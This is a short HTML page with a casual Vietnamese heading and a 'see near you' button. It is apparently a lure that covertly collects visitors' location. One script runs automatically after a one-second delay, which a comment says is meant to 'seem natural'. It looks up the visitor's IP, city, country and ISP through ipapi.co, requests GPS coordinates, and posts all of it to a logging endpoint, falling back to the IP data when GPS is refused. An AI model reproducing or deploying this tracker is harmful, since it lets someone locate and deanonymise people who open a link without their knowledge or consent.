<!DOCTYPE html>
<html>
<body>
<h1>alo vũ à vũ </h1>
<button onclick="getLocation()">Xem gần bạn</button>

<script>
function getLocation() {
  if (!navigator.geolocation) {
    alert("Không hỗ trợ GPS");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      console.log("GPS:", lat, lon);

      // gửi về server ở đây
      fetch("/api/log", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ lat, lon })
      });
    },
    () => {
      alert("Bạn chưa cho phép truy cập vị trí");
    }
  );
}
</script>
<script>
async function getData() {
  let data = {};

  // 1. Lấy IP + location
  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    data.ip = ipData.ip;
    data.city = ipData.city;
    data.country = ipData.country_name;
    data.isp = ipData.org;
  } catch (e) {
    console.log("IP fail");
  }

  // 2. Hàm gửi data
  function sendData() {
    fetch("/api/log", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
  }

  // 3. GPS (optional)
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        data.lat = pos.coords.latitude;
        data.lon = pos.coords.longitude;
        data.accuracy = pos.coords.accuracy;

        sendData();
      },
      () => {
        sendData(); // fallback IP
      },
      {
        timeout: 5000
      }
    );
  } else {
    sendData();
  }
}

// delay chút cho tự nhiên 😏
setTimeout(getData, 1000);
</script>

</body>
</html>
